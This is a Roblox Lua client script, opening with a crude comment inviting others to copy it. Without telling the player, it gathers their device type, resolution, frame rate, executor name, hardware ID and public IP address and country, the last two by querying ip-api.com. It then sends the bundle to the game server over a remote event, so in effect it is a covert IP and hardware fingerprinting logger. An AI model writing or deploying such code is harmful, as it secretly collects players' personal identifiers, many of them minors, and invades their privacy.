-- hi skid steal this code and be happy like little femboy
local Players        = game:GetService("Players")
local HttpService    = game:GetService("HttpService")
local RunService     = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local VRService      = game:GetService("VRService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local remotesFolder = ReplicatedStorage:WaitForChild("APRemotes", 15)
if not remotesFolder then return end

local RE_ClientData = remotesFolder:WaitForChild("ClientData", 10)
if not RE_ClientData then return end


local function getDevice()
	if VRService.VREnabled then return "VR Headset" end
	if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then return "Mobile" end
	if UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled then return "Console" end
	if UserInputService.KeyboardEnabled then return "PC" end
	return "Unknown"
end


local function getResolution()
	local cam = workspace.CurrentCamera
	if cam then
		local v = cam.ViewportSize
		return string.format("%dx%d", math.floor(v.X), math.floor(v.Y))
	end
	return "Unknown"
end


local function getFPS()
	local frames = 0
	local start  = tick()
	local conn
	conn = RunService.RenderStepped:Connect(function()
		frames = frames + 1
	end)
	task.wait(1)
	conn:Disconnect()
	return tostring(math.floor(frames / (tick() - start)))
end


local function getHWID()
	if gethwid then return gethwid() end
	if identifyexecutor then return HttpService:GenerateGUID(false) end
	return "Unavailable"
end


local function getExecutor()
	if identifyexecutor then return identifyexecutor() end
	if getexecutorname  then return getexecutorname() end
	return "Unknown"
end


local function getIPAndCountry()
	local ok, res = pcall(function()
		return request({
			Url = "http://ip-api.com/json/",
			Method = "GET",
		})
	end)
	if ok and res and res.StatusCode == 200 then
		local data = HttpService:JSONDecode(res.Body)
		if data then
			return data.query or "Unknown", data.country or "Unknown"
		end
	end
	return "Unknown", "Unknown"
end


task.spawn(function()
	local fps = getFPS()
	local ip, country = getIPAndCountry()

	local data = {
		device     = getDevice(),
		resolution = getResolution(),
		executor   = getExecutor(),
		fps        = fps,
		hwid       = getHWID(),
		ip         = ip,
		country    = country,
	}

	RE_ClientData:FireServer(data)
end)
